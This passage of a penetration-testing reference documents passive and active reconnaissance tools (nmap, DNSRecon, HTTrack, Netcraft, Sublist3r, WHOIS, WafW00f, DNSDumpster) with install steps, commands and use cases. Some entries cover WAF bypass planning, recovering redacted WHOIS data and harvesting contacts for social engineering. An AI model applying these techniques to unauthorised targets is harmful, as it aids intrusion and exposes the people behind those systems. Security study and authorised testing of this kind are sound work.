2. nmap -sn                           → host discovery
3. nmap -p- --min-rate 5000           → port discovery
4. nmap -sCV -p<ports>                → service fingerprinting
5. nikto / gobuster / enum4linux      → service enumeration
6. OpenVAS / Nessus / nmap --script vuln → vulnerability scan

docs.title: DNSRecon
docs.text:
Open-source DNS enumeration and security auditing tool. Performs detailed DNS queries to map domain infrastructure and detect misconfigurations.

GitHub: https://github.com/darkoperator/dnsrecon

docs.title: Installation
docs.text:
sudo apt install dnsrecon
# or
pip3 install dnsrecon

docs.title: What it finds
docs.text: Record type Description A / AAAA IPv4 / IPv6 addresses MX Mail servers NS Name servers TXT SPF, DKIM, verification records SOA Start of Authority — zone info Zone transfer Full DNS zone dump (if server misconfigured) Subdomains Via brute-force wordlist Reverse DNS IP → hostname resolution

docs.title: Core commands
docs.text:
# Standard record enumeration
dnsrecon -d example.com

# Zone transfer attempt
dnsrecon -d example.com -t axfr

# Subdomain brute force
dnsrecon -d example.com -t brt

# Reverse DNS sweep on a range
dnsrecon -r 192.168.1.0/24 -t rvl

# Google enumeration
dnsrecon -d example.com -t goo

# Save results to JSON
dnsrecon -d example.com -j output.json

# Save results to CSV
dnsrecon -d example.com --csv output.csv

docs.title: Scan types (-t)
docs.text: Type Description std Standard record lookup (default) axfr Zone transfer attempt brt Brute-force subdomain enumeration goo Google scraping for subdomains rvl Reverse lookup on IP range snoop Cache snooping against nameserver tld TLD expansion

docs.title: Complementary tools
docs.text: Tool Use dig Manual DNS query with fine-grained control fierce Subdomain-focused DNS scanner nmap Port/service scan after DNS recon dnsdumpster.com Visual passive DNS map subfinder Fast passive subdomain enumeration

docs.title: HTTrack
docs.text:
Open-source website crawler and offline browser. Downloads complete websites — HTML, CSS, JS, images — for offline analysis.

GitHub: https://github.com/xroche/httrack Official site: https://www.httrack.com

docs.title: Installation
docs.text: sudo apt install httrack

docs.title: Basic usage
docs.text:
# Clone a full website
httrack "https://example.com" -O "/path/to/output/"

# Limit crawl depth
httrack "https://example.com" -O "/path/to/output/" -r2

# Exclude specific file types
httrack "https://example.com" -O "/path/to/output/" -*.png -*.jpg

# Mirror with no external links
httrack "https://example.com" -O "/path/to/output/" -%e0

docs.title: Key options
docs.text: Option Description -O <dir> Output directory -r<n> Max crawl depth (default: unlimited) -*.ext Exclude file types +*.ext Include only specific file types -%e0 Don't follow external links -c<n> Max simultaneous connections --mirror Full mirror mode

docs.title: What it downloads
docs.text:
• HTML pages and internal links
  • CSS stylesheets and JS files
  • Images and multimedia
  • Documents (PDF, etc.) if linked

docs.title: Use cases in security
docs.text:
• Web application recon — map directory structure, find hidden endpoints, JS file analysis
  • Technology fingerprinting — inspect frontend frameworks, comment leaks, version strings in source
  • Historical comparison — clone now, compare later to detect changes
  • Offline analysis — examine source without repeated server requests

docs.title: Complementary tools
docs.text: Tool Use wget -r Simpler recursive web download Burp Suite Intercept/analyze live HTTP traffic Wayback Machine Downloader Download historical site snapshots curl Single-page download with full headers

docs.title: Netcraft
docs.text:
Internet security company providing web infrastructure intelligence, phishing detection, and domain/IP reporting services.

Site Report: https://sitereport.netcraft.com

docs.title: What Netcraft provides
docs.text: Feature Description WHOIS lookup Domain ownership, creation/expiry dates, registrar, DNS servers Server history Timeline of web server changes for a domain Technology detection Web server software (Apache, Nginx), OS, CMS, frameworks Phishing detection Flags domains involved in phishing or malware distribution Risk assessment Threat indicators associated with the domain

docs.title: Usage
docs.text:
1. Go to https://sitereport.netcraft.com
  2. Enter a domain or IP
  3. Click Search
  4. Review the full infrastructure report

docs.title: Key data points from a report
docs.text:
Domain:          example.com
Registrar:       GoDaddy
Created:         2004-01-15
Expires:         2025-01-15
Name servers:    ns1.example.com, ns2.example.com
Web server:      nginx/1.18.0
OS:              Linux
IP:              93.184.216.34
Hosting:         Edgecast Networks
Netblock owner:  Verizon Digital Media Services
First seen:      2004-02-01

docs.title: Use cases
docs.text:
• Passive recon — identify hosting provider, server stack, registrar without touching target
  • Phishing investigation — check if domain is flagged as malicious
  • Attack surface mapping — understand server history to find decommissioned endpoints
  • Technology profiling — know the stack before probing for version-specific CVEs

docs.title: Sublist3r
docs.text:
Passive subdomain enumeration tool. Queries search engines and public APIs to build a subdomain list without directly probing the target.

GitHub: https://github.com/aboul3la/Sublist3r

docs.title: Installation
docs.text:
git clone https://github.com/aboul3la/Sublist3r.git
cd Sublist3r && pip install -r requirements.txt

# or
sudo apt install sublist3r

docs.title: Basic usage
docs.text:
# Enumerate subdomains
sublist3r -d example.com

# Save output to file
sublist3r -d example.com -o subdomains.txt

# Verbose mode
sublist3r -d example.com -v

# Enable bruteforce in addition to passive search
sublist3r -d example.com -b

docs.title: Options
docs.text: Option Description -d Target domain -o <file> Save results to file -v Verbose output -b Enable brute-force mode -p <ports> Scan discovered subdomains on specified ports -e <engines> Comma-separated list of engines to use -t <threads> Thread count (default: 10)

docs.title: Data sources
docs.text: Sublist3r queries: Google, Bing, Yahoo, Baidu, Ask, Netcraft, VirusTotal, ThreatCrowd, SSL certificates, PassiveDNS

docs.title: Limitations
docs.text:
• Passive only by default — misses non-indexed subdomains
  • Search engine rate limits can slow results
  • For better coverage, combine with active tools

docs.title: Better alternatives (modern)
docs.text:
Tool Notes subfinder Faster, more sources, actively maintained amass Most thorough; passive + active modes assetfinder Lightweight, fast chaos ProjectDiscovery's massive subdomain dataset 
# Recommended modern workflow
subfinder -d example.com -o passive.txt
amass enum -passive -d example.com -o amass.txt
cat passive.txt amass.txt | sort -u > all_subdomains.txt

docs.title: WHOIS
docs.text: Protocol and command-line tool for querying public registration databases. Returns ownership, registration dates, DNS servers, and contact info for domains and IP ranges.

docs.title: Installation
docs.text:
Pre-installed on most Linux/macOS systems. On Debian/Ubuntu: 

sudo apt install whois

docs.title: Basic usage
docs.text:
# Domain lookup
whois example.com

# IP address lookup
whois 8.8.8.8

# Specific WHOIS server
whois -h whois.arin.net 8.8.8.8

docs.title: Key fields in output
docs.text: Field Description Domain Name Queried domain Registry Domain ID Unique domain identifier in registry Registrar Organization managing the registration Creation Date When the domain was first registered Expiration Date When registration expires Updated Date Last modification date Name Servers DNS servers authoritative for the domain Status Domain state (active, clientHold, pendingDelete, etc.) Registrant Owner name/org (often redacted for privacy) Admin / Tech Email Contact emails (often redacted)

docs.title: IP WHOIS
docs.text:
whois 8.8.8.8
# Returns: ASN, netblock owner (Google), country, abuse contact

Regional registries (ARIN, RIPE, APNIC, LACNIC, AFRINIC) hold IP block data.

docs.title: What to look for during recon
docs.text:
whois target.com | grep -iE "registrar|name server|creation|expir|registrant|email|phone"
  • Registrar → hosting/registrar relationship
  • Name servers → often reveals CDN, hosting provider, or managed DNS
  • Creation date → very new domain = higher risk of phishing
  • Expiry soon → potential for domain hijacking
  • Contact emails → useful for social engineering scope or OSINT

docs.title: Complementary tools
docs.text:
Tool Use nslookup Resolve domain → IP or IP → domain dig Detailed DNS record queries (A, MX, TXT, NS) host Quick DNS lookups DNSDumpster Visual WHOIS + DNS map Netcraft WHOIS + server history + tech stack 
# Typical passive recon sequence
whois target.com
dig target.com ANY
nslookup -type=mx target.com

docs.title: WHOIS privacy / GDPR note
docs.text: Since GDPR (2018), many registrars redact registrant personal data. Use historical WHOIS services (DomainTools, ViewDNS.info) to find pre-redaction records.

docs.title: WafW00f
docs.text:
WAF (Web Application Firewall) detection tool. Sends crafted requests to a target and analyzes responses to identify the WAF protecting it.

GitHub: https://github.com/EnableSecurity/wafw00f

docs.title: Installation
docs.text:
pip install wafw00f
# or
sudo apt install wafw00f

docs.title: Basic usage
docs.text:
# Detect WAF on a target
wafw00f https://example.com

# Test all known WAFs (slower but more thorough)
wafw00f -a https://example.com

# Verbose output
wafw00f -v https://example.com

# Output in JSON
wafw00f -o output.json https://example.com

# Test multiple targets from file
wafw00f -i targets.txt

docs.title: What it detects
docs.text:
WafW00f fingerprints 100+ WAFs including:

WAF Vendor Cloudflare Cloudflare AWS WAF Amazon ModSecurity Open Source Akamai Kona Akamai Imperva Incapsula Imperva F5 BIG-IP ASM F5 Barracuda WAF Barracuda Sucuri Sucuri 
# Example output
[*] Checking https://example.com
[+] The site https://example.com is behind Cloudflare (Cloudflare Inc.) WAF.
[~] Number of requests: 7

docs.title: How it works
docs.text:
1. Sends normal baseline request
  2. Sends crafted malicious payloads (SQLi, XSS probes)
  3. Compares response headers, body, and status codes
  4. Matches patterns against WAF signature database

docs.title: Use in pentesting
docs.text:
• Before active testing — know if WAF is present; adjust payloads accordingly
  • WAF bypass planning — identify WAF type → research known bypass techniques
  • Scope documentation — document security controls in pentest report

docs.title: Complementary tools
docs.text: Tool Use nmap --script http-waf-detect Alternative WAF detection via Nmap NSE Burp Suite Manual WAF behavior analysis via HTTP proxy sqlmap --tamper Tamper scripts to bypass detected WAFs cloudflair Find origin IP behind Cloudflare

docs.title: DNSDumpster
docs.text:
Web-based passive DNS reconnaissance tool. Maps DNS infrastructure of a target domain using public data — no direct contact with target servers.

URL: https://dnsdumpster.com

docs.title: What it finds
docs.text: Record type Info A IPv4 addresses for the domain and subdomains MX Mail servers NS Name servers TXT SPF, DKIM, and other TXT records Subdomains Associated subdomains discovered from public sources IP geolocation Country/region for each IP

docs.title: Usage
docs.text:
1. Go to https://dnsdumpster.com
  2. Enter domain (e.g. example.com)
  3. Results show DNS records, subdomain map, and IP distribution
  4. Export as PDF for offline analysis

docs.title: Key features
docs.text:
• Passive only — no requests sent to target; reduces detection risk
  • Free — no account required
  • Visual output — infrastructure map showing how DNS components relate
  • Fast — results in seconds

docs.title: Use cases
docs.text:
• Subdomain discovery before active testing
  • Identify mail/name servers for phishing simulation scope
  • Map attack surface during initial recon phase

docs.title: Limitations
docs.text:
• Coverage depends on public data sources — may miss recent subdomains
  • No brute-force capability (use subfinder, amass, or dnsrecon -t brt for that)
  • Rate-limited on free tier
